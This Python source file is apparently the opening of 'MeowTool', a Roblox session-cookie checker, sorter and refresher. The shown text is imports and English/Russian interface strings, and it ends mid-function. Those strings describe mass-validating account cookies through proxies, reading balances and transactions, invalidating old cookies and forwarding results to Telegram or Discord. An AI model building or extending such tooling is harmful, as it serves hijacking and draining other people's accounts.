import os
OS_SEP = os.sep
import sys
cmdWriter = sys.stdout.write
cmdFlusher = sys.stdout.flush
import platform
import time
import subprocess
import traceback
import asyncio
import shutil
import itertools
import copy
import random
import re
import zipfile
import logging
import logging.handlers
import webbrowser
import locale
from pathlib import Path
from typing import Optional, Literal
from datetime import datetime

IMPORTS = {
    'colorama': 'colorama==0.4.6',
    'tomlkit': 'tomlkit==0.13.3',
    'aiohttp': 'aiohttp==3.12.15',
    'aiohttp_socks': 'aiohttp_socks==0.10.1',
    'requests': 'requests==2.32.4',
    'aiofiles': 'aiofiles==24.1.0',
    'aiogram': 'aiogram==3.21.0',
    'discord_webhook': 'discord-webhook==1.4.1',
    'emoji': 'emoji==2.14.1',
    'columnar': 'columnar==1.4.1'
}

def cls() -> None:
    os.system('cls' if os.name == 'nt' else 'clear')

try:
    import colorama; colorama.init()
    from tomlkit import TOMLDocument, table, document, nl, comment, loads, dumps
    from tomlkit.items import Table, Item, Array
    from aiohttp import TCPConnector, ClientSession, ClientResponse, ClientTimeout, ClientOSError, ServerDisconnectedError
    from aiohttp.http_exceptions import TransferEncodingError
    from aiohttp.client_exceptions import ClientPayloadError, SocketTimeoutError
    from aiohttp_socks import ProxyConnector, ProxyError
    from requests.exceptions import InvalidURL, InvalidSchema, MissingSchema
    import aiofiles
    from aiogram import Bot
    from aiogram.types import FSInputFile
    from aiogram.enums import ParseMode
    from aiogram.exceptions import TelegramBadRequest, TelegramNetworkError, TelegramUnauthorizedError
    from aiogram.utils.token import TokenValidationError
    from discord_webhook import DiscordWebhook, DiscordEmbed
    import emoji
    from columnar import columnar
except Exception as e:
    cls()
    traceback.print_exc()
    if type(e) == ModuleNotFoundError:
        print(f'\n  [?] Try to install module: pip install {IMPORTS[str(e)[17:-1]]}')
    input('\n  [<] Press Enter to close the program...')
    sys.exit()

# MeowTool :3

VERSION = 'v2.3.4'

### ANSI коды

class ANSI:
    class FG: # text colors
        RED    = '\x1b[31m' # DISABLED / BAD
        GREEN  = '\x1b[32m' # ENABLED  / GOOD
        YELLOW = '\x1b[33m' # UI       / WARN
        BLUE   = '\x1b[34m' # UI
        PURPLE = '\x1b[35m' # UI
        CYAN   = '\x1b[36m' # UI       / INFO
        WHITE  = '\x1b[37m' # UI
        GRAY   = '\x1b[90m' # UI
        PINK   = '\x1b[95m' # UI
    class DECOR: # text decorations
        BOLD         = '\x1b[1m'  # UI
        UNDERLINEON  = '\x1b[4m'  # UI
        UNDERLINEOFF = '\x1b[24m' # UI
        FLASHING     = '\x1b[5m'  # UI
        FLASHINGOFF  = '\x1b[25m' # UI
    # Clear all decorations and colors
    CLEAR = '\x1b[0m'

### Переводы

def translateLoad(language: str) -> None:
    global MT_Config_Loader_Not_Found_Creating, MT_Successfully_Saved_A_Backup_Copy_Of_Loader, MT_Successfully_Saved_A_Backup_Copy_Of_Config, MT_Saving_A_Backup_Copy_Of_Loader, MT_Saving_A_Backup_Copy_Of_Config, MT_Error, MT_Critical_Error, MT_Unknown_Error, MT_Waking_Up_Our_Eared_Helper, MT_Tidying_Folders_Onto_Their_Little_Shelves, MT_Eared_Assistant_Is_Watching, MT_Checking_Integrity_Config_Loader, MT_Checking_Integrity_Config, MT_We_Will_Find_Out_Name_Your_Config_From_Loader, MT_Asking_The_Config_Pretty_Please_For_Settings, MT_Crossing_Paws_For_Honest_Translations, MT_Cozying_Up_For_Comfort_And_Snugness, MT_Fantasizing_About_The_Name, MT_Almost_There_Just_A_Little_Couple_Of_Hours, MT_Checking_Your_Trendiness_Level, MT_Yay_New_Update_Available_Shall_We_Fetch_It, MT_Hooray_You_Are_On_The_Latest_And_Greatest, MT_Current_Version, MT_Latest_Version, MT_Yes_I_Want_The_Version, MT_No_Maybe_Later, MT_Gathering_Update_Goodies, MT_Aww_Couldnt_Check_Maybe_The_Internets_Napping, MT_What_Now, MT_Lets_Check_It_Again, MT_Checking_Again, MT_Continue_Launching, MT_Oh_Noo_My_Home_It_Is_Over, MT_Enter_Something
    if 'russia' not in language:
        MT_Config_Loader_Not_Found_Creating = 'Config loader not found. Creating'
        MT_Successfully_Saved_A_Backup_Copy_Of_Loader = 'Successfully saved a backup copy of loader'
        MT_Successfully_Saved_A_Backup_Copy_Of_Config = 'Successfully saved a backup copy of config'
        MT_Saving_A_Backup_Copy_Of_Loader = 'Saving a backup copy of loader'
        MT_Saving_A_Backup_Copy_Of_Config = 'Saving a backup copy of config'
        MT_Error = 'Error'
        MT_Critical_Error = 'Critical error'
        MT_Unknown_Error = 'Unknown error'
        MT_Waking_Up_Our_Eared_Helper = 'Waking up our eared helper'
        MT_Tidying_Folders_Onto_Their_Little_Shelves = 'Tidying folders onto their little shelves'
        MT_Eared_Assistant_Is_Watching = 'Eared assistant is watching'
        MT_Checking_Integrity_Config_Loader = 'Checking the integrity of the loader'
        MT_Checking_Integrity_Config = 'Checking the integrity of the config'
        MT_We_Will_Find_Out_Name_Your_Config_From_Loader = 'We\'ll find out the name of your config from the loader'
        MT_Asking_The_Config_Pretty_Please_For_Settings = 'Asking the config, pretty please, for settings'
        MT_Crossing_Paws_For_Honest_Translations = 'Crossing paws for honest translations'
        MT_Cozying_Up_For_Comfort_And_Snugness = 'Cozying up for comfort and snugness'
        MT_Fantasizing_About_The_Name = 'Fantasizing about the name'
        MT_Almost_There_Just_A_Little_Couple_Of_Hours = 'Almost there, just a little couple of hours'
        MT_Checking_Your_Trendiness_Level = 'Checking your trendiness level'
        MT_Yay_New_Update_Available_Shall_We_Fetch_It = 'Yay! New update available, shall we fetch it?'
        MT_Hooray_You_Are_On_The_Latest_And_Greatest = 'Hooray! You\'re on the latest and greatest'
        MT_Current_Version = 'Current version'
        MT_Latest_Version = 'Latest version'
        MT_Yes_I_Want_The_Version = 'Yes, I want the \'{}\' version'
        MT_No_Maybe_Later = 'No, maybe later'
        MT_Gathering_Update_Goodies = 'Gathering update goodies'
        MT_Aww_Couldnt_Check_Maybe_The_Internets_Napping = 'Aww, couldn\'t check. Maybe the internet\'s napping?'
        MT_What_Now = 'What now?'
        MT_Lets_Check_It_Again = 'Let\'s check it again'
        MT_Checking_Again = 'Checking again'
        MT_Continue_Launching = 'Continue launching'
        MT_Oh_Noo_My_Home_It_Is_Over = 'Oh noo, my home, it\'s over'
        MT_Enter_Something = 'Enter something'
    else:
        MT_Config_Loader_Not_Found_Creating = 'Загрузчик не найден. Создаём'
        MT_Successfully_Saved_A_Backup_Copy_Of_Loader = 'Успешно сохранили резервную копию загрузчика'
        MT_Successfully_Saved_A_Backup_Copy_Of_Config = 'Успешно сохранили резервную копию конфига'
        MT_Saving_A_Backup_Copy_Of_Loader = 'Сохраняем резервную копию твоего загрузчика'
        MT_Saving_A_Backup_Copy_Of_Config = 'Сохраняем резервную копию твоего конфига'
        MT_Error = 'Ошибка'
        MT_Critical_Error = 'Критическая ошибка'
        MT_Unknown_Error = 'Неизвестная ошибка'
        MT_Waking_Up_Our_Eared_Helper = 'Будим ушастого помощника'
        MT_Tidying_Folders_Onto_Their_Little_Shelves = 'Сортируем папки по полочкам'
        MT_Eared_Assistant_Is_Watching = 'Ушастый помощник наблюдает'
        MT_Checking_Integrity_Config_Loader = 'Проверяем целостность загрузчика'
        MT_Checking_Integrity_Config = 'Проверяем целостность конфига'
        MT_We_Will_Find_Out_Name_Your_Config_From_Loader = 'Узнаём название твоего конфига у загрузчика'
        MT_Asking_The_Config_Pretty_Please_For_Settings = 'Мило просим у конфига настройки'
        MT_Crossing_Paws_For_Honest_Translations = 'Надеемся на честность переводов'
        MT_Cozying_Up_For_Comfort_And_Snugness = 'Настраиваемся к комфорту и уюту'
        MT_Fantasizing_About_The_Name = 'Фантазируем над названием'
        MT_Almost_There_Just_A_Little_Couple_Of_Hours = 'Почти готово, ещё парочку часов'
        MT_Checking_Your_Trendiness_Level = 'Проверяем твою трендовость'
        MT_Yay_New_Update_Available_Shall_We_Fetch_It = 'Ух-ты! Доступна новая версия, будем качать?'
        MT_Hooray_You_Are_On_The_Latest_And_Greatest = 'Ура! У тебя последняя версия'
        MT_Current_Version = 'Текущая версия'
        MT_Latest_Version = 'Последняя версия'
        MT_Yes_I_Want_The_Version = 'Да, я хочу \'{}\' версию'
        MT_No_Maybe_Later = 'Нет, как-нибудь потом'
        MT_Gathering_Update_Goodies = 'Добываем данные для обновления'
        MT_Aww_Couldnt_Check_Maybe_The_Internets_Napping = 'Не могу проверить. Может интернет немножечко прилёг'
        MT_What_Now = 'Что будем делать?'
        MT_Lets_Check_It_Again = 'Проверим ещё раз'
        MT_Checking_Again = 'Проверяем ещё раз'
        MT_Continue_Launching = 'Продолжить запуск'
        MT_Oh_Noo_My_Home_It_Is_Over = 'О неет, мой дом, всё пропало'
        MT_Enter_Something = 'Введи что-то'

def translateMT(language: str) -> None:
    global MT_Temporarily_Does_Not_Work, MT_Search_For_Strings_Similar_To_Roblox_Cookie, MT_Timestamps, MT_Can_Break_USA_Cookie, MT_Symbols, MT_Add_Symbols_Between_Warning_And_Cookie, MT_Try, MT_Tickets, MT_Output_Total, MT_Available_Formats, MT_Move_Cookie_To_The_Next_Line, MT_First_Number_Must_Be_Less_Than_Second_One, MT_Specify_Two_Numbers_Separated_By_A_Space, MT_Both_Parameters_Must_Be_Numbers, MT_From, MT_To, MT_Sort_By_Zero, MT_Sort_Numbers_From_To, MT_Sort_Numbers_From, MT_Sort_By_Group_Name, MT_Sort_By_Bundle_Name, MT_Sort_By_Place_Name, MT_Sort_By_Badge_Name, MT_Sort_By_Gamepass_Name, MT_Sort_By_Number, MT_Enter_Something, MT_Eep, MT_Number, MT_Names, MT_Place_Number, MT_Place_Names, MT_Name_Number, MT_Output_Mode, MT_Non_Empty, MT_Duplicates, MT_On, MT_Account_Duplicate, MT_Automatically_Find_The_Chat_ID, MT_Manually_Find_The_Chat_ID, MT_Bye, MT_Conversion_Error, MT_We_Out_Now, MT_Oh_Noo_My_Home_It_Is_Over, MT_Response_Code, MT_Server_Could_Not_Process_The_Request, MT_Rate_Limit_Has_Been_Reached, MT_Proxy_Error, MT_Waiting_Time_Exceeded, MT_Do_Not_Exceed_The_Thread_Limit, MT_File_Is_Too_Big, MT_Break_Old_Cookies, MT_Banned, MT_Account_Banned, MT_Invalid_Token_Format, MT_Invalid_URL_Format, MT_Send_Any_Message_To_The_Bot_And_Try_Again, MT_Specify_The_Bot_Token, MT_Specify_The_Chat_ID, MT_Specify_The_Webhook_URL, MT_Following_The_Link, MT_Message_Was_Sent, MT_Enter_A_Bot_Token, MT_Enter_A_Chat_ID, MT_Enter_A_Webhook_URL, MT_Send, MT_You, MT_Results_To_Telegram, MT_Results_To_Discord, MT_Create_A_Bot, MT_Search_Chat_ID, MT_Telegram, MT_Discord, MT_Specify, MT_Value_Must_Consist_Of_Digits, MT_Value_Cannot_Be_Empty, MT_Successfully, MT_Unsuccessfully, MT_Possibly_The_Internet_Is_Unstable, MT_Possibly_A_Typo_In_The_Bot_Token, MT_Possibly_A_Typo_In_The_Chat_ID, MT_Unknown_Error, MT_Possibly_A_Typo_In_The_Webhook_URL, MT_Unknown_Server_Response_Code, MT_Bot_Token, MT_Chat_ID, MT_Telegram_Bot, MT_Webhook_URL, MT_Discord_Webhook, MT_Outputs, MT_Spent, MT_Transactions, MT_Status, MT_Play_The_Sound_At_The_End_Of_The_Work, MT_Show_Amount_Of_Lines_In_Files, MT_Count_Robux_In_Total, MT_Cookie, MT_Format, MT_Enable_At_Least_One_Place_To_Start_Analysis, MT_Number_Of_Threads_For_Transaction_Analysis, MT_Output_Filename, MT_Name_Output_File_The_Same_As_Input_File, MT_Transaction_With_This_Name_Already_Exists, MT_Enter_A_Transaction_Name, MT_Add_A_Transaction, MT_Ignore, MT_Ignore_All, MT_Do_Not_Ignore_All, MT_Important, MT_Ignore_List, MT_Discover_New_Names_For_Ignore_List, MT_Save_Old_Versions, MT_Updates, MT_Yes, MT_No, MT_Max_Indentation, MT_No_Indentation, MT_Transaction_Analysis, MT_Save_All_Places_In_One_File, MT_Save_Places_To_Different_Files, MT_Add_Nick_After_Cookie_In_Folder_Names, MT_Add_Robux_After_Place_In_File_Names, MT_Indentation_By_The_Longest_Place_Name , MT_Item, MT_Price, MT_Date, MT_Open_MeowTool_On_GitHub, MT_You_Are_Using_Version_Of_Program, MT_Open_The_Showcase_On_YouTube, MT_Open_PM_With_Developer_In_Telegram, MT_Open_Latest_Changes, MT_About_The_Program, MT_Check_For_Updates, MT_No_Cookies_Found, MT_All_Cookies_Were_Invalid, MT_Number_Of_Threads_For_Valid_Checker, MT_Number_Of_Threads_For_Main_Checker, MT_Enter_Number_Of_Threads, MT_First_We_Check_For_Valid, MT_Valid, MT_Invalid, MT_First_Check_All_Cookies_For_Valid, MT_No_Cookie_Was_Found, MT_No_Proxy_Was_Found, MT_Auto_Protocol, MT_Use_Proxy, MT_Auto_Protocol_If_Not_Specified, MT_Any, MT_Key_To_Continue, MT_File_Was_Not_Created, MT_File_Is_Missing, MT_Incorrect_Cookies_Removed, MT_Rate_Limit_Has_Been_Reached, MT_Checker, MT_Proxy, MT_The_Name_Cannot_Be_Empty, MT_Do_Not_Use_This_Characters, MT_Enter_A_New_Title, MT_Console_Title, MT_Show_Place_ID_Next_To_The_Name, MT_Disable_Warnings_For_Links, MT_Disable_Warnings_For_Dangerous_Actions, MT_Show_Cookie, MT_Data, MT_Find, MT_Save_Invalid_Cookies, MT_Save_Cookies_Added_Manually, MT_Save_Cookies_Checked_By_Checker, MT_Start_Refresher, MT_Wait, MT_Can_Run, MT_Do_You_Sure, MT_I_Am_Sure, MT_Not_Yet, MT_Reset_To_Default_Settings, MT_Reload_Config, MT_New_Cookie, MT_Old_Cookie, MT_In, MT_Enter_A_Cookie, MT_Incorrect_Cookie, MT_Invalid_Cookie, MT_Single_Mode, MT_Mass_Mode, MT_Could_Not_Connect_To_The_API, MT_Trying_To_Connect_Again, MT_Bind, MT_Show_Label_MeowTool, MT_Show_Label_by_h1kken, MT_Parameter_Must_Be_A_Number, MT_Add_A_Parameter, MT_Sort, MT_Sorting, MT_The_Place_Has_No_Gamepasses_And_Badges, MT_Custom_Places, MT_Enable_All, MT_Disable_All, MT_Id, MT_Nickname, MT_Name, MT_Link, MT_Duplicated_Cookies_Removed, MT_Unique_Cookies_Found, MT_Successfully_Uploaded_In, MT_Place_ID, MT_Place_Name, MT_Place_Link, MT_Gamepasses, MT_Badges, MT_Remove_Emojies, MT_Remove_Round_Brackets, MT_Remove_Square_Brackets, MT_Upload_All_Info_Gamepasses_And_Badges, MT_Enable_Something_In, MT_Save_Without_Protocol, MT_Save_In, MT_The_Data_Is_Saved_In, MT_Incorrect_Length_Of_String, MT_Incorrect_Length_Of_ID, MT_Incorrect_Length_Of_Parameter, MT_Incorrect_Length_Of_Name, MT_Gamepass_With_This_Name_Already_Exists, MT_Add_A_Gamepass_Name, MT_Found_Data_On, MT_The_Place_Has_No_Gamepasses, MT_The_Place_Has_No_Badges, MT_Gamepasses_Parser_From_The_Place, MT_Badges_Parser_From_The_Place, MT_Misc, MT_Seconds, MT_Waiting_Time, MT_Output_Total, MT_Found, MT_Lines, MT_Start_Sorting, MT_Enter_The_Parameter_Value, MT_Enter_The_Waiting_Time, MT_Enter_The_Gamepass_Name, MT_Enter_The_Place_ID, MT_Enter_The_Bundle_ID, MT_Gamepasses, MT_Badges, MT_Fix_Console, MT_Settings, MT_General, MT_Main, MT_Places, MT_Language, MT_Configs, MT_Check, MT_Save, MT_Auto_Save_Changes, MT_Update_List, MT_Back, MT_Close_Program, MT_Add_A_Bundle_By_ID, MT_Add_A_Place_By_ID, MT_Create_Config, MT_Cancel, MT_Load_On_Launch, MT_Load, MT_File_Location, MT_Rename, MT_Delete, MT_Enter_Name_For_New_Config, MT_Enter_New_Name_For_Config, MT_Enter_New_Filename, MT_User_Agreement, MT_User_Agreement_1, MT_User_Agreement_2, MT_User_Agreement_3, MT_User_Agreement_4, MT_Such_A_Parameter_Already_Exists, MT_Bundle_With_This_ID_Already_Exists, MT_Place_With_This_ID_Already_Exists, MT_Incorrent_Bundle_ID, MT_Incorrent_Place_ID, MT_Incorrect_Filename, MT_File_With_This_Name_Already_Exists, MT_Incorrect_Waiting_Time_60, MT_Incorrect_Value, MT_Of, MT_Start_Checking_File, MT_Checking_Complete, MT_Sorting_File, MT_Sorting_Complete, MT_Press_Enter_To_Continue, MT_Request, MT_Everything_Or_Something_Is_On, MT_Everything_Is_On_Or_Off, MT_Total, MT_Roblox, MT_Checker, MT_Cookie_Sorter, MT_Cookie_Checker, MT_Cookie_Refresher, MT_Beta, MT_Only_Goodness, MT_Hi
    match str(language).upper():
        case 'EN':
            MT_Temporarily_Does_Not_Work = 'Temporarily doesn\'t work'
            MT_Search_For_Strings_Similar_To_Roblox_Cookie = 'Search for strings similar to roblox cookies (any of the 100+ characters)'
            MT_Timestamps = {'d':'d', 'h':'h', 'm':'m', 's':'s', 'ms':'ms'}
            MT_Can_Break_USA_Cookie = 'Can break USA cookie'
            MT_Symbols = 'Symbols'
            MT_Add_Symbols_Between_Warning_And_Cookie = 'Add symbols between _|WARNING|_ and cookie'
            MT_Try = 'Try'
            MT_Tickets = 'Tickets'
            MT_Output_Total = 'Output total'
            MT_Available_Formats = 'Available formats'
            MT_Move_Cookie_To_The_Next_Line = 'Move cookie to the next line'
            MT_First_Number_Must_Be_Less_Than_Second_One = 'The first number must be less then the second one'
            MT_Specify_Two_Numbers_Separated_By_A_Space = 'You need to specify two numbers separated by a space'
            MT_Both_Parameters_Must_Be_Numbers = 'Both parameters must be numbers'
            MT_From = 'From'
            MT_To = 'To'
            MT_Sort_By_Zero = 'Sort by zero'
            MT_Sort_Numbers_From_To = 'Sort numbers from ... to ...'
            MT_Sort_Numbers_From = 'Sort numbers from ...'
            MT_Sort_By_Group_Name = 'Sort by group name'
            MT_Sort_By_Bundle_Name = 'Sort by bundle name'
            MT_Sort_By_Place_Name = 'Sort by place name'
            MT_Sort_By_Badge_Name = 'Sort by badge name'
            MT_Sort_By_Gamepass_Name = 'Sort by gamepass name'
            MT_Sort_By_Number = 'Sort by number'
            MT_Enter_Something = 'Enter something'
            MT_Eep = 'Eep'
            MT_Number = 'Number'
            MT_Names = 'Names'
            MT_Place_Number = 'Place (Number)'
            MT_Place_Names = 'Place (Names)'
            MT_Name_Number = 'Name (Number)'
            MT_Output_Mode = 'Output mode'
            MT_Non_Empty = 'Non-empty'
            MT_Duplicates = 'Duplicates'
            MT_On = 'On'
            MT_Account_Duplicate = 'Account duplicate'
            MT_Automatically_Find_The_Chat_ID = 'Automatically find the chat ID'
            MT_Manually_Find_The_Chat_ID = 'Manually find the chat ID'
            MT_Bye = 'Bye'
            MT_Conversion_Error = 'Conversion error'
            MT_We_Out_Now = 'We out now'
            MT_Response_Code = 'Response code'
            MT_Server_Could_Not_Process_The_Request = 'Server could not process the request'
            MT_Rate_Limit_Has_Been_Reached = 'Rate limit has been reached'
            MT_Proxy_Error = 'Proxy error'
            MT_Waiting_Time_Exceeded = 'Waiting time exceeded'
            MT_Do_Not_Exceed_The_Thread_Limit = 'Do not exceed the {} thread limit'
            MT_File_Is_Too_Big = 'File is too big'
            MT_Break_Old_Cookies = 'Break old cookies'
            MT_Banned = 'Banned', 'Banned'
            MT_Account_Banned = 'Account banned'
            MT_Invalid_Token_Format = 'Invalid token format'
            MT_Invalid_URL_Format = 'Invalid URL format'
            MT_Send_Any_Message_To_The_Bot_And_Try_Again = 'Send any message to the bot and try again'
            MT_Specify_The_Bot_Token = 'Specify the bot token'
            MT_Specify_The_Chat_ID = 'Specify the chat ID'
            MT_Specify_The_Webhook_URL = 'Specify the webhook URL'
            MT_Following_The_Link = 'Following the link'
            MT_Message_Was_Sent = 'Message was sent'
            MT_Enter_A_Bot_Token = 'Enter a bot token'
            MT_Enter_A_Chat_ID = 'Enter a chat ID'
            MT_Enter_A_Webhook_URL = 'Enter a webhook URL'
            MT_Send = 'Send', 'Send', 'Sent', 'Send'
            MT_You = 'You', 'You', 'Are you'
            MT_Results_To_Telegram = 'Results to Telegram'
            MT_Results_To_Discord = 'Results to Discord'
            MT_Create_A_Bot = 'Create a bot'
            MT_Telegram = 'Telegram', 'TG'
            MT_Discord = 'Discord', 'DS'
            MT_Specify = 'Specify'
            MT_Value_Must_Consist_Of_Digits = 'Value must consist of digits'
            MT_Value_Cannot_Be_Empty = 'Value can not be empty'
            MT_Successfully = 'Successfully'
            MT_Unsuccessfully = 'Unsuccessfully'
            MT_Possibly_The_Internet_Is_Unstable = 'Possibly the internet is unstable'
            MT_Possibly_A_Typo_In_The_Bot_Token = 'Possibly a typo in the bot token'
            MT_Possibly_A_Typo_In_The_Chat_ID = 'Possibly a typo in the chat ID'
            MT_Unknown_Error = 'Unknown error'
            MT_Possibly_A_Typo_In_The_Webhook_URL = 'Possibly a typo in the webhook URL'
            MT_Unknown_Server_Response_Code = 'Unknown server response code'
            MT_Bot_Token = 'Bot token'
            MT_Chat_ID = 'Chat ID', 'chat ID'
            MT_Telegram_Bot = 'Telegram bot'
            MT_Webhook_URL = 'Webhook URL', 'webhook URL'
            MT_Discord_Webhook = 'Discord webhook'
            MT_Outputs = 'Outputs'
            MT_Spent = 'Spent'
            MT_Transactions = 'Transactions'
            MT_Status = 'Status'
            MT_Play_The_Sound_At_The_End_Of_The_Work = 'Play the sound at the end of the work'
            MT_Show_Amount_Of_Lines_In_Files = 'Show amount of lines in files'
            MT_Count_Robux_In_Total = 'Count robux in total'
            MT_Cookie = 'Cookie'
            MT_Format = 'Format'
            MT_Enable_At_Least_One_Place_To_Start_Analysis = 'Enable at least one place to start analysis'
            MT_Number_Of_Threads_For_Transaction_Analysis = 'Number of threads for transaction analysis'
            MT_Output_Filename = 'Output filename'
            MT_Name_Output_File_The_Same_As_Input_File = 'Name output file the same as input file'
            MT_Transaction_With_This_Name_Already_Exists = 'Transaction with this name already exists'
            MT_Enter_A_Transaction_Name = 'Enter a transaction name'
            MT_Add_A_Transaction = 'Add a transaction'
            MT_Ignore = 'Ignore'
            MT_Ignore_All = 'Ignore all'
            MT_Do_Not_Ignore_All = 'Do not ignore all'
            MT_Important = 'Important'
            MT_Ignore_List = 'Ignore list'
            MT_Discover_New_Names_For_Ignore_List = 'Discover new names for ignore list'
            MT_Save_Old_Versions = 'Save old versions'
            MT_Updates = 'Updates'
            MT_Yes = 'Yes'
            MT_No = 'No'
            MT_Max_Indentation = 'Max indentation'
            MT_No_Indentation = 'No indentation'
            MT_Transaction_Analysis = 'Transaction analysis'
            MT_Save_All_Places_In_One_File = 'Save all places in one file'
            MT_Save_Places_To_Different_Files = 'Save places to different files'
            MT_Add_Nick_After_Cookie_In_Folder_Names = 'Add nick after cookie in folder names'
            MT_Add_Robux_After_Place_In_File_Names = 'Add robux after place in file names'
            MT_Indentation_By_The_Longest_Place_Name = 'Indentation by the longest place name'
            MT_Item = 'Item'
            MT_Price = 'Price'
            MT_Date = 'Date'
            MT_You_Are_Using_Version_Of_Program = f'You are using {VERSION} version of program'
            MT_Open_Latest_Changes = 'Open latest changes'
            MT_Open_MeowTool_On_GitHub = 'Open MeowTool on GitHub'
            MT_Open_The_Showcase_On_YouTube = 'Open the showcase on YouTube'
            MT_Open_PM_With_Developer_In_Telegram = 'Open PM with developer in Telegram'
            MT_About_The_Program = 'About the program'
            MT_Check_For_Updates = 'Check for updates'
            MT_No_Cookies_Found = 'No cookies found'
            MT_All_Cookies_Were_Invalid = 'All cookies were invalid'
            MT_Number_Of_Threads_For_Valid_Checker = 'Number of threads for valid checker'
            MT_Number_Of_Threads_For_Main_Checker = 'Number of threads for main checker'
            MT_Enter_Number_Of_Threads = 'Enter number of threads'
            MT_First_We_Check_For_Valid = 'First we check for valid'
            MT_Valid = 'Valid'
            MT_Invalid = 'Invalid'
            MT_First_Check_All_Cookies_For_Valid = 'First check all cookies for valid'
            MT_No_Cookie_Was_Found = 'No cookie was found, the check was canceled'
            MT_No_Proxy_Was_Found = 'No proxy was found, the check was canceled'
            MT_Auto_Protocol = 'Auto protocol'
            MT_Use_Proxy = 'Use proxy'
            MT_Auto_Protocol_If_Not_Specified = 'The protocol, if it isn\'t specified in file'
            MT_Any = 'Any'
            MT_Key_To_Continue = 'Key to continue'
            MT_File_Was_Not_Created = 'File was not created'
            MT_File_Is_Missing = 'File is missing somewhere, strange'
            MT_Incorrect_Cookies_Removed = 'Incorrect cookies removed'
            MT_Rate_Limit_Has_Been_Reached = 'Rate-Limit has been reached'
            MT_Checker = 'Checker'
            MT_Proxy = 'Proxy'
            MT_The_Name_Cannot_Be_Empty = 'The name cannot be empty'
            MT_Do_Not_Use_This_Characters = 'Do not use this characters'
            MT_Enter_A_New_Title = 'Enter a new title'
            MT_Console_Title = 'Console title'
            MT_Show_Place_ID_Next_To_The_Name = 'Show place ID next to the name'
            MT_Disable_Warnings_For_Links = 'Disable warnings for links'
            MT_Disable_Warnings_For_Dangerous_Actions = 'Disable warnings for dangerous actions'
            MT_Show_Cookie = 'Show cookie'
            MT_Data = 'Data'
            MT_Find = 'Find'
            MT_Save_Invalid_Cookies = 'Save invalid cookies'
            MT_Save_Cookies_Added_Manually = 'Save cookies added manually'
            MT_Save_Cookies_Checked_By_Checker = 'Save cookies checked by checker'
            MT_Start_Refresher = 'Start refresher'
            MT_Wait = 'Wait', 'Waiting'
            MT_Can_Run = 'Can run'
            MT_Do_You_Sure = 'Do you sure?'
            MT_I_Am_Sure = 'I am sure'
            MT_Not_Yet = 'Not yet'
            MT_Reset_To_Default_Settings = 'Reset to default settings'
            MT_Reload_Config = 'Reload config'
            MT_New_Cookie = 'New cookie'
            MT_Old_Cookie = 'Old cookie'
            MT_In = 'In', 'In'
            MT_Enter_A_Cookie = 'Enter a cookie', 'Enter a cookie'
            MT_Incorrect_Cookie = 'Incorrect cookie'
            MT_Invalid_Cookie = 'Invalid cookie'
            MT_Single_Mode = 'Single mode'
            MT_Mass_Mode = 'Mass mode'
            MT_Could_Not_Connect_To_The_API = 'Couldn\'t connect to the API'
            MT_Trying_To_Connect_Again = 'Trying to connect again'
            MT_Bind = 'Bind'
            MT_Show_Label_MeowTool = 'Show label \'MeowTool\''
            MT_Show_Label_by_h1kken = 'Show label \'by h1kken :3\''
            MT_Parameter_Must_Be_A_Number = 'Parameter must be a number'
            MT_Add_A_Parameter = 'Add a parameter'
            MT_Sort = 'Sort'
            MT_Sorting = 'Sorting'
            MT_The_Place_Has_No_Gamepasses_And_Badges = 'The place has no gamepasses and badges'
            MT_Custom_Places = 'Custom places'
            MT_Enable_All = 'Enable all'
            MT_Disable_All = 'Disable all'
            MT_Id = 'ID'
            MT_Nickname = 'Nickname'
            MT_Name = 'Name'
            MT_Link = 'Link'
            MT_Duplicated_Cookies_Removed = 'Duplicated cookies removed'
            MT_Unique_Cookies_Found = 'Unique cookies found'
            MT_Successfully_Uploaded_In = 'Successfully uploaded in'
            MT_Place_ID = 'Place\'s ID'
            MT_Place_Name = 'Place\'s name'
            MT_Place_Link = 'Place\'s link'
            MT_Gamepasses = 'Gamepasses'
            MT_Badges = 'Badges'
            MT_Remove_Emojies = 'Remove emojies from the name'
            MT_Remove_Round_Brackets = 'Remove (and what is inside them) from the name'
            MT_Remove_Square_Brackets = 'Remove [and what is inside them] from the name'
            MT_Upload_All_Info_Gamepasses_And_Badges = 'Upload all information about gamepasses and badges from the program'
            MT_Enable_Something_In = 'Enable something in: Settings > Roblox > Cookie checker > Main'
            MT_Save_Without_Protocol = 'Save without protocol'
            MT_Save_In = 'Save in'
            MT_The_Data_Is_Saved_In = 'The data is saved in'
            MT_Incorrect_Length_Of_String = 'String length cannot exceed {} characters'
            MT_Incorrect_Length_Of_ID = 'ID length cannot exceed {} characters'
            MT_Incorrect_Length_Of_Parameter = 'Every parameter length cannot exceed {} characters'
            MT_Incorrect_Length_Of_Name = 'Name length cannot exceed {} characters'
            MT_Gamepass_With_This_Name_Already_Exists = 'Gamepass with this name already exists'
            MT_Add_A_Gamepass_Name = 'Add a gamepasse\'s name'
            MT_Found_Data_On = 'Found data on'
            MT_The_Place_Has_No_Gamepasses = 'The place has no gamepasses'
            MT_The_Place_Has_No_Badges = 'The place has no badges'
            MT_Gamepasses_Parser_From_The_Place = 'Gamepasses parser from the place'
            MT_Badges_Parser_From_The_Place = 'Badges parser from the place'
            MT_Misc = 'Misc'
            MT_Seconds = 'sec'
            MT_Waiting_Time = 'Waiting time'
            MT_Output_Total = 'Output total'
            MT_Found = 'Found'
            MT_Lines = 'Lines'
            MT_Start_Sorting = 'Start sorting'
            MT_Enter_The_Parameter_Value = 'Enter the parameter value'
            MT_Enter_The_Waiting_Time = 'Enter the waiting time in seconds'
            MT_Enter_The_Gamepass_Name = 'Enter the gamepasse\'s name'
            MT_Enter_The_Place_ID = 'Enter the place\'s ID'
            MT_Enter_The_Bundle_ID = 'Enter the bundle\'s ID'
            MT_Gamepasses = 'Gamepasses'
            MT_Badges = 'Badges'
            MT_Fix_Console = 'Fix console'
            MT_Settings = 'Settings'
            MT_General = 'General'
            MT_Main = 'Main'
            MT_Places = 'Places'
            MT_Language = 'Language'
            MT_Configs = 'Configs'
            MT_Check = 'Check'
            MT_Save = 'Save', 'Save'
            MT_Auto_Save_Changes = 'Auto. save changes'
            MT_Update_List = 'Update list'
            MT_Back = 'Back'
            MT_Close_Program = 'Close the program'
            MT_Add_A_Bundle_By_ID = 'Add a bundle by ID'
            MT_Add_A_Place_By_ID = 'Add a place by ID'
            MT_Create_Config = 'Create config'
            MT_Cancel = 'Cancel'
            MT_Load_On_Launch = 'Load on launch'
            MT_Load = 'Load'
            MT_File_Location = 'File location'
            MT_Rename = 'Rename'
            MT_Delete = 'Delete'
